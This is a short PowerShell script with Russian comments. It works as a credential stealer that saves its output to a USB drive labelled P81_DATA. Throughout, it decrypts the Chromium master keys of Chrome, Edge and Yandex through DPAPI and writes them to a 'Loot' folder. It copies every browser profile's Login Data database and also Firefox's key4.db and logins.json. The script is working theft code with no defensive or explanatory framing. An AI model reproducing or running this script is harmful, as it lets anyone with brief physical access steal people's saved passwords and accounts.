# 1. Поиск флешки по метке P81_DATA
$u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
if (!$u) { exit }
$usb = "$($u):"

# 2. Создание папки с уникальной меткой времени
$dest = "$usb\Loot_$(Get-Date -f mmss)"
mkdir $dest -Force | Out-Null

# 3. Подготовка дешифровки (Chromium)
Add-Type -AssemblyName System.Security
$report = "$dest\KEYS.txt"

# Список путей для Chrome, Edge и Яндекса
$browsers = @(
    @{n="Chrome"; p="$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{n="Edge"; p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{n="Yandex"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $path = $b.p
    if (Test-Path $path) {
        # Извлекаем мастер-ключ для этого браузера
        $ls = "$path\Local State"
        if (Test-Path $ls) {
            try {
                $json = Get-Content $ls -Raw | ConvertFrom-Json
                $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
                $unp = [Security.Cryptography.ProtectedData]::Unprotect($key[5..($key.Length-1)], $null, 0)
                "[$($b.n)] Master Key: $([Convert]::ToBase64String($unp))" >> $report
            } catch {}
        }

        # Копируем базы Login Data из всех профилей
        Get-ChildItem -Path $path -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
            $profile = $_.Directory.Name
            # Имя файла на флешке: Браузер_Профиль_LoginData.db
            $targetName = "$($b.n)_$($profile)_LoginData.db"
            Copy-Item $_.FullName -Destination "$dest\$targetName" -Force
        }
    }
}

# 4. Сбор данных Firefox
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    Get-ChildItem $ffPath -Directory | ForEach-Object {
        $pName = $_.Name
        $files = @("key4.db", "logins.json")
        foreach ($f in $files) {
            $src = Join-Path $_.FullName $f
            if (Test-Path $src) {
                # Имя файла на флешке: FF_ИмяПрофиля_названиефайла
                $target = "FF_$($pName)_$f"
                Copy-Item $src -Destination "$dest\$target" -Force
            }
        }
    }
}

exit
